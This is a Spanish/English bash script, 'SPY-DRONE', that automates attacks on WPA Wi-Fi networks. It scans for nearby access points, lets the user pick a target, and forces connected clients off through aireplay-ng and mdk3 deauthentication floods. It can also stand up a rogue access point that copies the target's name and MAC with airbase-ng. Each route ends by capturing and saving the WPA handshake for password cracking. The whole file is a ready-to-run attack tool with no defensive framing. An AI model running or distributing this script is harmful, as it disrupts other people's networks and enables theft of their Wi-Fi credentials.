#!/bin/bash




#################################################################
#                                                               #
#                                                               #
#                                                               #
#                                                               #
#       ██████╗  ██████╗  ██████╗ ██████╗ ██╗███╗   ██╗██╗      #
#       ██╔░░██╗██╔░████╗██╔░████╗██╔░░██╗██║████╗  ██║██║      #
#       ██████╔╝██║██╔██║██║██╔██║██████╔╝██║██╔██╗ ██║██║      #
#       ██╔░░██╗████╔╝██║████╔╝██║██╔░░██╗██║██║╚██╗██║██║      #
#       ██║  ██║╚██████╔╝╚██████╔╝██████╔╝██║██║ ╚████║██║      #
#       ╚░╝  ╚░╝ ╚░░░░░╝  ╚░░░░░╝ ╚░░░░░╝ ╚░╝╚░╝  ╚░░░╝╚░╝      #
#                                                               #
#              Email    : roobini.gamer@protonmail.com          #
#              Instagram: https://bit.ly/3iX0ljO                #
#              Youtube  : https://bit.ly/2Emapnn                #
#              Facebook : https://bit.ly/3he568k                #
#              Github   : https://bit.ly/2E8gFzx                #
#                                                               #
#################################################################


blanco="\033[1;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
#############################################detecta mdk3 #######################################################

DETECTMDK3(){                                                                       
which mdk3 &> /dev/null                                                            
if [ $? -ne 0 ]; then  
echo ""
echo -e $rojo " The mdk3 program is not Installed"
echo ""
echo -e $amarillo " You can choose 1 of these 3 Attacks:"                        
echo ""
echo -e $azul 
echo "1) Aireplay-ng"
echo ""
echo "2) Honeypot"
echo ""
echo "3) Honeypot + Aireplay-ng"
echo -e $amarillo""
read -ep " Choose an option:" P                                                 
case $P in
1)                                                      
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH AIREPLAY-NG"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
sleep 2
echo ""
echo -e $verde" Capturando Datos y Esperando Handshake...."
SNIFF &
CSV
HANDSHAKE1 
;;
2)                                    
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH HONEYPOT"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
HONEYPOT
ATAQUEHONEYPOT2
;;
3)                                   
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH HONEYPOT + AIREPLAY-NG"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
HONEYPOT
ATAQUEHONEYPOT
;;
esac
else
echo ""
echo -e $verde"   MDK3 is Correctly Installed"  
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
sleep 1 
fi
}
########################################## detectar root ###########################################################
FUNCROOT(){
W=$(whoami)
if [ "$W" == "root" ]; then
sleep 0.5
else 
echo ""
echo " You need to login as root to continue ..." 
echo "" 
exit
fi
}
################################################ Seleccion y Ataque Honeypot ##############################################
HONEYPOT(){
echo -e ""$amarillo 
echo -e " Choose the type of encryption for the Honeypot"
echo -e ""
echo -e $azul"   1) WPA-TKIP"
echo -e "   2) WPA-CCMP"
echo -e "   3) WPA2-TKIP"
echo -e "   4) WPA2-CCMP"
echo -e $verde ""
read -ep " Enter option number: " A
case $A in
1)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -z 2 -a $bssid $intmon &
;;
2)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -z 4 -a $bssid $intmon &
;;
3)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -Z 2 -a $bssid $intmon &
;;
4)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -Z 4 -a $bssid $intmon &
;;
*)
echo -e $rojo" ERROR: invalid option"
HONEYPOT   
;;
esac
}
ATAQUEHONEYPOT(){
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $verde "              Creating Honeypot ..."
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
echo -e $amarillo""
airmon-ng start $intrfz > /dev/null 2>&1
SNIFF1 &
CSV
HANDSHAKE1
}
ATAQUEHONEYPOT1(){
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $verde "              Creating Honeypot ..."
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
echo -e $amarillo""
airmon-ng start $intrfz > /dev/null 2>&1
SNIFF1 &
CSV
HANDSHAKE2
}
ATAQUEHONEYPOT2(){
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $verde "              Creating Honeypot ..."
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
echo -e $amarillo""
airmon-ng start $intrfz > /dev/null 2>&1
SNIFF1 &
CSV
HANDSHAKE3
}
################################################ Mdk3 ##############################################################
MDK3(){
xterm -e mdk3 $intmon d $bssid & 
mdk3pid=$! 
sleep 10 && kill $mdk3pid &>/dev/null 
if [ ! -e /proc/$mdk3pid ]; then
sleep 2
fi
}
####################################################Seleccionar la tarjeta###########################################
SELECT(){

iwconfig --version | grep "Recommend" | awk '{print $1}' > ./redes/iw.txt
airmon-ng | sed '3d' | awk '{print $2}' | sed '/^$/d' > ./redes/id.txt
cont=1
for j in `cat ./redes/iw.txt`
do 
      var=`nl ./redes/id.txt | grep $cont | awk '{print $2}'`
      echo $j"       "$var
      let cont=cont+1
done > ./redes/iwi.txt
declare -a tarj_disp
  for i in "tarj_disp";
    do
    count=1                
      if [ "$i" == "tarj_disp" ]; then
         while read -r line; do
           tarj_disp[${count}]="$line"
            count=$((count+1)) 
         done < <( cat ./redes/iwi.txt )
      fi
done

ntarj=$(echo ${#tarj_disp[@]})
if [ -z "${ntarj}" ];
  then
  echo -e ""$rojo" ERROR:"$verde" No wireless card detected"
  echo ""
  sleep 2
  exit
else
  echo ""
  echo -e ""$verde"  The following interfaces have been detected :"
  echo ""
  echo -e $magenta" ╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
    for i in ${!tarj_disp[*]}; do
       echo -e $amarillo"          $i)        ${tarj_disp[${i}]}      "  
    done
    if [ $ntarj -ge 1 ]; then
     echo -e $magenta" ╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"$azul""
     echo ""
     read -p " Select an Interface: " opt
       while [[ $opt < 1 ]] || [[ $opt > $ntarj ]]; do
         echo ""
         echo -e $rojo" ERROR!"$verde"... Invalid Option"
         echo ""
         echo -e $magenta"   ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "$azul""
         echo ""
       read -p " Select an Interface: " opt
    done
   fi 
   
intrfaz=$(echo ${tarj_disp[${opt}]}) 
intrfz=`echo $intrfaz | awk '{print $1}'`
fi
}
####################################################Iniciar la tarjeta###############################################
START(){
ifconfig $intrfz down > /dev/null 2>&1
ifconfig $intrfz up > /dev/null 2>&1
iwconfig $intrfz rate 1M > /dev/null 2>&1
}
#################################################Poner en modo monitor################################################
MONITORUP(){ 
airmon-ng start $intrfz > /dev/null 2>&1
ifconfig mon0 > /dev/null 2>&1
echo ""
echo -e $magenta" ╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $verde"          Activating "$amarillo""$intrfz""$verde" The monitor mode"
echo -e $magenta" ╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
echo ""
sleep 2
if [ $? = 0 ]; then
intmon=mon0
else
intmon=$intrfz
fi
}
##################################################Buscar redes######################################################
SEARCH(){
echo -e $verde "  Starting network scan ..."$rojo"Ctrl + C stops the process "
echo -e $magenta"   ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
echo ""
sleep 2
xterm -e airodump-ng --encrypt WPA -w ./redes/Redes $intmon  
linap=`cat redes/Redes-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
linap=`expr $linap - 1`
head -n $linap redes/Redes-01.csv &> redes/Redes.csv 
tail -n +$linap redes/Redes-01.csv &> redes/clientes.csv 
clear
lincsv=`wc -l redes/Redes.csv | awk '{print $1}'`
if [ $lincsv -le 3 ]; then
echo ""
echo -e $rojo
echo -e " No network found ... exiting script ... "
echo ""
KILL
sleep 2
exit
fi
rm -rf redes/Redes.txt> /dev/null 2>&1
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
caracteres_mac=${#MAC}
if [ $caracteres_mac -ge 17 ]; then
i=$(($i+1))
if [[ $POWER -lt 0 ]]; then
if [[ $POWER -eq -1 ]]; then
POWER=0
else
POWER=`expr $POWER + 100`
fi
fi
POWER=`echo $POWER | awk '{gsub(/ /,""); print}'`  
ESSID=`expr substr "$ESSID" 2 $IDLENGTH` 
if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ]; then
CHANNEL=0
else
CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'`
fi
if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ]; then
ESSID="(Red Oculta)"
fi
echo -e "$MAC,$CHANNEL,$POWER,$ESSID" >> redes/Redes.txt
fi
done < redes/Redes.csv
sort -t "," -d -k 4 "redes/Redes.txt" > "redes/redes_wifi.txt"
}
################################################seleccionar red#####################################################
SELECTWIFI(){
clear
echo
echo -e  $azul"  Nº       BSSID         CANAL   PWR      ESSID"
echo -e  $magenta"  ░░   ░░░░░░░░░░░░░░   ░░░░░░  ░░░░░  ░░░░░░░░░░░""$verde"
echo ""
i=0
while IFS=, read MAC CANAL POTENCIA ESSID; do
i=$(($i+1))
if [ $i -le 9 ]; then
ESPACIO1=" "
else
ESPACIO1=""
fi
if [[ $CANAL -le 9 ]]; then
ESPACIO2=" "
if [[ $CANAL -eq 0 ]]; then
CANAL="-"
fi
else
ESPACIO2=""
fi
if [[ "$POTENCIA" = "" ]]; then
POTENCIA=0
fi
if [[ $POTENCIA -le 9 ]]; then
ESPACIO4=" "
else
ESPACIO4=""
fi
CLIENTE=`cat redes/clientes.csv | grep $MAC`
if [ "$CLIENTE" != "" ]; then
CLIENTE="*" 
ESPACIO5=""
else
ESPACIO5=" "
fi
nombres_ap[$i]=$ESSID
canales[$i]=$CANAL
macs[$i]=$MAC
echo -e " $ESPACIO1$i)"$blanco"$CLIENTE"$amarillo"  $ESPACIO5$MAC "$verde"  $ESPACIO2$CANAL  "$amarillo"  $ESPACIO4$POTENCIA%  "$verde" $ESSID "
done < "redes/redes_wifi.txt"
echo
if [ $i -eq 1 ]; then
select=1
else
echo -e $verde "("$blanco"*"$verde") Network with Clients"$azul""
echo ""
read -p " Select the network to attack: " select
fi
while [[ $select -lt 1 ]] || [[ $select -gt $i ]]; do
echo ""
echo -e $rojo " ERROR!"$verde" Incorrect Option"$azul""
echo ""
read -p " Select the network to attack: " select
done
essid=${nombres_ap[$select]}
CANAL=${canales[$select]}
bssid=${macs[$select]}
bssidseparado=`echo $bssid | awk '{gsub(/:/,"-"); print}'`
echo ""
if [ "$essid" = "(Red Oculta)" ]; then
echo -e $rojo ""
echo -e " ERROR!: you have selected a hidden network ..."
echo -e $amarillo""
sleep 1
echo -e " Exiting the Script ..."
KILL
exit
fi
}
########################################Capturar Trafico##########################################################
SNIFF(){
xterm -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid ($bssidseparado)" $intmon &
}
SNIFF1(){
xterm -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid ($bssidseparado)" mon1 &
}
############################################Tamaño y calculo Captura################################################
CALCULANUM(){
NUM=`ls -1 redes/"$essid ($bssidseparado)"-*.cap | wc -l`
if [ $NUM -lt 10 ]; then
CERO="0"
else
CERO=""
fi
}
#############################################CSV##################################################################
CSV(){
counter=1
ls redes/"$essid ($bssidseparado)"-01.csv > /dev/null 2>&1
while [ ! $? -eq 0 ]; do
echo -e ""$azul".\c"
sleep 0.2
counter=$((counter+1))
if [ $counter -gt 15 ]; then
counter=1
fi
ls redes/"$essid ($bssidseparado)"-01.csv > /dev/null 2>&1
done
echo -e "$amarillo\n"
}
########################################### Forzar Handshake Aireplay ##############################################
HANDSHAKE1(){
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
intervalo=20
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r${TAB} Looking for clients ... \c"
CONT=1
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Deauthenticating client "$amarillo"$hay... \033[K"
xterm -e aireplay-ng -R --ignore-negative-one -0 5 -a $bssid -c $hay $intmon
CONT=$((CONT+1))
done
CONT=$intervalo
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $CONT -eq 1 ]; then
echo -e $azul"\r${TAB} Restarting attack on "$verde" $CONT...   $amarillo $hands  \c"$verde
else
if [ $CONT -lt 10 ]
then
echo -e $azul"\r${TAB} Restarting attack on "$verde" $CONT...   $amarillo $hands  \c"$verde
else
echo -e $azul"\r${TAB} Restarting attack on "$verde" $CONT...   $amarillo $hands  \c"$verde
fi
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
sleep 1
CONT=$((CONT-1))
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $blanco"      (╯°□°) "$verde"HANDSHAKE ACHIEVED "$blanco" (╯°□°)╯"
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
wpaclean "handshake/$essid ($bssidseparado).cap" "networks/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " The Handshake is in the handshake folder d[@_@]b "
echo ""
echo -e " The handshake path is "$verde"$ruta_handshake" 
sleep 1
echo "" 
echo -e $azul " Good bye ʕ·͡ᴥ·ʔ "
echo ""
break
fi
done
}
############################################# Forzar Handshake MDK3 ##################################################
HANDSHAKE2(){
intervalo=20
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r${TAB} Looking for clients ...\c"
CONT=1
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Launching MDK3 attack on "$azul"$essid... \033[K""$verde"
echo ""
sleep 1
MDK3
CONT=$((CONT+1))
done
CONT=$intervalo
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $CONT -eq 1 ]; then
echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
else
if [ $CONT -lt 10 ]; then
echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
else
echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
fi
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
sleep 1
CONT=$((CONT-1))
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $blanco"      (╯°□°) "$verde"HANDSHAKE ACHIEVED"$blanco" (╯°□°)╯"
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " The handshake is in the handshake folder d[@_@]b "
echo ""
echo -e " The handshake path is "$verde"$ruta_handshake"
sleep 1
echo "" 
echo -e $azul " Good bye ʕ·͡ᴥ·ʔ "
echo ""
break
fi
done
}
####################################### Handshake Honeypot ###########################################################
HANDSHAKE3(){
intervalo2=300
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r Looking for clients ...\c"
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Launching Honeypot ... \033[K""$verde"
CONT=$((CONT+1))
done
CONT=$intervalo2
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "╔░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╗"
echo -e $blanco"         ¡¡¡ "$verde"HANDSHAKE ACHIEVED"$blanco" (╯°□°)╯"
echo -e $magenta "╚░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╝"
wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " The handshake is in the handshake folder d[@_@]b "
echo ""
echo -e " The handshake path is "$verde"$ruta_handshake"   
sleep 1
echo "" 
echo -e $azul " Good bye ʕ·͡ᴥ·ʔ "
echo ""
break
fi
done
}
###################################################Desactivar el modo monitor########################################
MONSTOP(){
intmons=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
let cuantas=`echo $intmons | wc -w`
let CONT=1
while [ $CONT -le $cuantas ]; do
MON=`echo $intmons| awk '{print $'$CONT'}'`
airmon-ng stop $MON > /dev/null 2>&1
let CONT=$CONT+1
done
}
#################################################Matar los procesos###################################################
KILL(){
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
while [ "$pids" != "" ]; do
killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
done
MONSTOP
rm -fr ./redes > /dev/null 2>&1
mkdir redes > /dev/null 2>&1
}
###################################### PROGRAMA HANDSHAKER ##########################################################
FUNCROOT
KILL
clear
echo ""
echo ""
echo -e $amarillo"  ╔══════════════════════════════════════════════════════╗"
echo -e $amarillo"  ║     ▄▄▄▄▄▄▄          █▀▀▀  ▀▀▀█          ▄▄▄▄▄▄▄     ║" 
echo -e $amarillo"  ║   ▄█████████▄       █ ▄▀█  █▀▄ █       ▄█████████▄   ║" 
echo -e $amarillo"  ║   ██─▀███▀─██      ▐▌          ▐▌      ██─▀███▀─██   ║" 
echo -e $amarillo"  ║   ▀████▀████▀      █▌▀▄  ▄▄  ▄▀▐█      ▀████▀████▀   ║" 
echo -e $amarillo"  ║     ██▀█▀██       ▐██  ▀▀  ▀▀  ██▌       ██▀█▀██     ║" 
echo -e $amarillo"  ║      ▀▄▄▄▀       ▄████▄  ▐▌  ▄████▄       ▀▄▄▄▀      ║"
echo -e $amarillo"  ║                                                      ║" 
echo -e $amarillo"  ║ "$azul" Wellcome To SPY-DRONE "$blanco"v1.0 (beta)"$azul" by R00B!Ni_gamer"$amarillo"  ║"
echo -e "  ╚══════════════════════════════════════════════════════╝"
sleep 3
clear 
SELECT
START
MONITORUP
SEARCH
SELECTWIFI
echo ""
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
echo ""
echo -e $amarillo" Choose from one of the following attacks"
echo ""
echo ""
echo -e $azul" 1) Aireplay-ng"
echo
echo " 2) MDK3"
echo
echo " 3) Honeypot"
echo
echo " 4) Honeypot + Aireplay-ng"
echo
echo " 5) Honeypot + MDK3"
echo ""
echo -e $amarillo""
read -p " Choose an option: " OPC
echo ""
if [ "$OPC" = 1 ]; then
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH AIREPLAY-NG"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
echo ""
echo -e $verde" CGetting Data and Waiting for Handshake ..."
SNIFF &
CSV
HANDSHAKE1
elif [ "$OPC" = 2 ]; then
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH MDK3"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
DETECTMDK3
echo ""
echo -e $verde" Getting Data and Waiting for Handshake ..."
SNIFF &
CSV
HANDSHAKE2
elif [ "$OPC" = 3 ]; then
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH HONEYPOT"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
HONEYPOT
ATAQUEHONEYPOT2
elif [ "$OPC" = 4 ]; then
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH HONEYPOT + AIREPLAY-NG"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
HONEYPOT
ATAQUEHONEYPOT
elif [ "$OPC" = 5 ]; then
echo ""
echo -e $amarillo " You have chosen : "$azul"ATTACK WITH HONEYPOT + MDK3"
echo -e $magenta "  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  ʕ·͡ᴥ·ʔ  "
echo ""
DETECTMDK3
HONEYPOT
ATAQUEHONEYPOT1
fi
################################################## Fin #############################################################
